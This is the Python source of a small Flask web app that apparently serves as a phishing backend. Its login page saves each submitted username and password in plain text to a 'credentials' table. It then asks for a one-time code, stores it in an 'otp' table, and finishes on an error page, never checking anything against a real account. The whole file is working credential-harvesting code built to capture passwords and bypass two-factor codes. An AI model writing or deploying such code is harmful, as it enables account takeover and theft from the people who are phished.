from flask import Flask, render_template, request, redirect, url_for
import sqlite3
import os
from datetime import datetime

app = Flask(__name__)

DB_DIR = "outputs"
DB_PATH = os.path.join(DB_DIR, "database.db")


def init_db():
    os.makedirs(DB_DIR, exist_ok=True)

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    cur.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date TEXT,
            time TEXT,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    """)

    cur.execute("""
        CREATE TABLE IF NOT EXISTS otp (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date TEXT,
            time TEXT,
            otp TEXT NOT NULL
        )
    """)

    conn.commit()
    conn.close()


@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if not username or not password:
            return render_template("index.html", error="All fields are required")

        now = datetime.now()
        date = now.strftime("%d-%m-%Y")
        time = now.strftime("%H:%M:%S")

        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO credentials (date, time, username, password) VALUES (?, ?, ?, ?)",
            (date, time, username, password)
        )
        conn.commit()
        conn.close()

        return redirect(url_for("otp"))

    return render_template("index.html")


@app.route("/otp", methods=["GET", "POST"])
def otp():
    if request.method == "POST":
        otp_value = request.form.get("otp")

        if not otp_value:
            return render_template("otp.html", error="OTP must not be empty")

        now = datetime.now()
        date = now.strftime("%d-%m-%Y")
        time = now.strftime("%H:%M:%S")

        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO otp (date, time, otp) VALUES (?, ?, ?)",
            (date, time, otp_value)
        )
        conn.commit()
        conn.close()

        return redirect(url_for("error_page"))

    return render_template("otp.html")


@app.route("/error")
def error_page():
    return render_template("error.html")


if __name__ == "__main__":
    init_db()
    app.run(host = "0.0.0.0", port = 5000, debug = True)
